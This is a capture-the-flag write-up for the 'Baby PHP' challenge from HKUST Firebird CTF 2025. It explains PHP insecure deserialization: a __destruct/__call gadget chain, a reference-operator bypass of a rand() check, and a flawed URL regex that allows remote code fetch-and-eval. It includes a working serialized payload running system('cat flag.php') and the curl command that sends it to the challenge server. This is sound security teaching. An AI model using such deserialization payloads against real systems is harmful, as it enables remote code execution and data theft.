# Baby PHP

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Solved by: @siunam
- 4 solves / 894 points
- Author: @ppcc
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

Just some simple PHP deserialization.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/images/Pasted%20image%2020250113163156.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/images/Pasted%20image%2020250113163217.png)

In here, we are given the PHP source code of this page.

After a quick look, we need to provide a GET parameter called `payload`, otherwise it'll call PHP function [`highlight_file`](https://www.php.net/manual/en/function.highlight-file.php) to show the source code of this PHP script:

```php
[...]
if (!isset($_GET['payload'])) {
    highlight_file(__FILE__);
    exit;
}
```

If we have provided the `payload` parameter, it'll deserialize it via PHP function [`unserialize`](https://www.php.net/manual/en/function.unserialize.php) (The deserialization errors are suppressed via the `@` error control operator):

```php
[...]
$payload = $_GET['payload'];

$a = @unserialize($payload);

exit;
```

With that said, this PHP script basically allows us to perform **PHP object injection**, or commonly known as **insecure deserialization**. If you don't know much about this vulnerability class, it enables us to craft an arbitrary serialized object string, and then deserialized by the application. This could allow us to call different classes' methods via magic methods. In PHP, currently there are 17 [magic methods](https://www.php.net/manual/en/language.oop5.magic.php). However, we're only interested in 2 magic methods: [`__destruct`](https://www.php.net/manual/en/language.oop5.decon.php#object.destruct) and [`__call`](https://www.php.net/manual/en/language.oop5.overloading.php#object.call).

In this PHP script, there are 5 classes, which are `A`, `B`, `C`, `D`, and `E`. In class `A`, we can see that it has magic method `__destruct`:

```php
class A
{
    public $class;
    
    public function __destruct() 
    {
        $this->class->func();
    }
}
```

In PHP, when the object is deserialized via function `unserialize`, it'll automatically call magic method `__destruct`. In the above overridden `__destruct` magic method, **it calls `$this->class`'s `func` method**.

However, all the classes in this script doesn't have method named `func`. But, they have overridden magic method `__call`, such as class `E`:

```php
class E {
    [...]
    public function __call($method, $args) {
        if ($this->i === $this->j and $this->i !== $this->j) {
            echo file_get_contents( __DIR__ . "/flag.php" );
        }
    }
}
```

According to [PHP's documentation](https://www.php.net/manual/en/language.oop5.overloading.php#object.call), it said:

> [\_\_call()](https://www.php.net/manual/en/language.oop5.overloading.php#object.call) is triggered when invoking inaccessible methods in an object context.

Therefore, if we call method `func` on any classes, it'll **automatically execute magic method `__call`**.

Alright, let's see if we can get the flag or gain RCE (Remote Code Execution) via those classes' magic method `__call`!

Let's take a look at class `E` first:

```php
class E {
    public $i;
    public $j;

    public function __call($method, $args) {
        if ($this->i === $this->j and $this->i !== $this->j) {
            echo file_get_contents( __DIR__ . "/flag.php" );
        }
    }
}
```

In here, it displays the content of file `<current_working_directory>/flag.php`, if properties `i` and `j` are the same and not the same?? What? How?

Hmm... How about class `D` then:

```php
class D {
    public $msgA;
    public $msgB;
    public $msgC;

    public function __call($method, $args) 
    {
        // Same message same hash
        if (FALSE == $condition1 = ($this->msgA == $this->msgB and hash('md5', $this->msgA) == hash('md5', $this->msgB))) {
            return;
        }

        // Different message same hash
        if (FALSE == $condition2 = ($this->msgB !== $this->msgC and hash('md5', $this->msgB) == hash('md5', $this->msgC))) {
            return;
        }

        // Same message different hash
        if (FALSE == $condition3 = ($this->msgC == $this->msgA and hash('md5', $this->msgC) !== hash('md5', $this->msgA))) {
            return;
        }

        // Additional check if all the conditions are met
        $final_condition = $condition1 and $condition2 and $condition3 and $this->msgA === $this->msgB and $this->msgB === $this->msgC and
            hash('md5', $this->msgA) === hash('md5', $this->msgB) and hash('md5', $this->msgB) === hash('md5', $this->msgC);

        if ($final_condition) {
            echo file_get_contents( __DIR__ . "/flag.php" );
        }
    }
}
```

In here, we need to pass the `$final_condition` in order to get the flag. If we look closely, those conditions might be vulnerable to **type juggling** and **MD5 hash collision**. Uhh... It looks quite complex... Let's move on to the next class, class `C`:

```php
// Possible if you can control other challenges
class C {
    public $url;

    public function __call($method, $args) 
    {
        if (preg_match('#^https://phoenix.firebird\.sh(/.*)?$#', $this->url)) {
            $content = file_get_contents($this->url);
            eval($content);
        }
    }
}
```

In this class, if property `url` passes the regular expression (regex) check, it'll send a GET request to the URL and [`eval`](https://www.php.net/manual/en/function.eval.php) to execute arbitrary PHP code. So, if we pass that check, we can gain RCE.

In that regex pattern, the URL must start with `https://phoenix.firebird.sh` and optionally ends with `/<anything>`. Although we can't bypass the regex so that we can control the hostname, the regex is actually flawed.

In the first `.` character, it didn't get escaped with a backslash (`\`) character, which means the regex pattern will match any character in that character. So, in theory, we can register a domain like `phoenix<any_character_in_here>firebird.sh`, we can gain RCE.

Well, in practice, the `.sh` TLD (Top-Level Domain) is kinda expensive. In [AWS Route 53](https://aws.amazon.com/route53/), it costs 76 USD per year:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/images/Pasted%20image%2020250113171453.png)

Uhh... Let's find another method to get the flag, it's too expensive. :(

In class `B`, the magic method's if statement seems impossible at the first glance:

```php
class B
{
    public $command;
    public $guess;
    public $random_number;

    public function __call($method, $args)
    {
        // You will get it eventually
        for ($i = 0; $i < 100; $i++) {
            $this->guess = rand();
            if ($this->guess !== $this->random_number) {
                echo "Incorrect guess: " . $this->guess . "<br>";
                return;
            }
        }
        eval($this->command);
    }
}
```

In here, the magic method will **check if properties `guess` and `random_number` are the same for 100 times**. If the check is passed, it'll call `eval` with property `command`. However, property `guess` will be generated differently in every loop via PHP function [`rand`](https://www.php.net/manual/en/function.rand.php) which generates a random integer.

Can we bypass that check? Well, yes. Since PHP is written in C, some features are similiar to C. In both PHP and C, they have something called [reference operator](https://www.php.net/manual/en/language.oop5.references.php) `&`, which means the variable's value is refered to the referenced variable:

```php
class A {
    public $foo = 1;
}

$b = new A;
$c = &$b; // $c === $b, they are the same
```

Therefore, we can set property `random_number` is a reference to the `guess` property, thus the check is bypassed.

## Exploitation

Armed with above information, we can craft the following serialized object string to gain RCE!

<details><summary><strong>payload.php</strong></summary>

```php
<?php
include_once "index.php";

$a = new A();
$a->class = new B();
$a->class->command = "system('cat flag.php');";
$a->class->guess = 1; // this could be any integer value
$a->class->random_number = &$a->class->guess; // bypass the for loop check

$serialized = serialize($a);
echo $serialized;
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/HKUST-Firebird-CTF-Competition-2025/Web/Baby-PHP)-[2025.01.13|17:31:31(HKT)]
└> php payload.php
O:1:"A":1:{s:5:"class";O:1:"B":3:{s:7:"command";s:23:"system('cat flag.php');";s:5:"guess";i:1;s:13:"random_number";R:4;}}
[...]
```

```shell
┌[siunam♥Mercury]-(~/ctf/HKUST-Firebird-CTF-Competition-2025/Web/Baby-PHP)-[2025.01.13|17:33:41(HKT)]
└> curl --get http://phoenix-chal.firebird.sh:36010/ --data-urlencode "payload=O:1:\"A\":1:{s:5:\"class\";O:1:\"B\":3:{s:7:\"command\";s:23:\"system('cat flag.php');\";s:5:\"guess\";i:1;s:13:\"random_number\";R:4;}}"
<?php
$flag = "firebird{The_challenge_of_addressing_PHP_bugs_is_exacerbated_by_the_languages_flexibility_and_dynamic_nature_which_introduces_a_myriad_of_potential_pitfalls_and_edge_cases_that_can_be_difficult_to_anticipate_and_mitigate}"; 
echo "flag{You_win_This_is_the_flag}";
?>
```

- **Flag: `firebird{The_challenge_of_addressing_PHP_bugs_is_exacerbated_by_the_languages_flexibility_and_dynamic_nature_which_introduces_a_myriad_of_potential_pitfalls_and_edge_cases_that_can_be_difficult_to_anticipate_and_mitigate}`**

## Conclusion

What we've learned:

1. PHP insecure deserialization & bypass via reference operator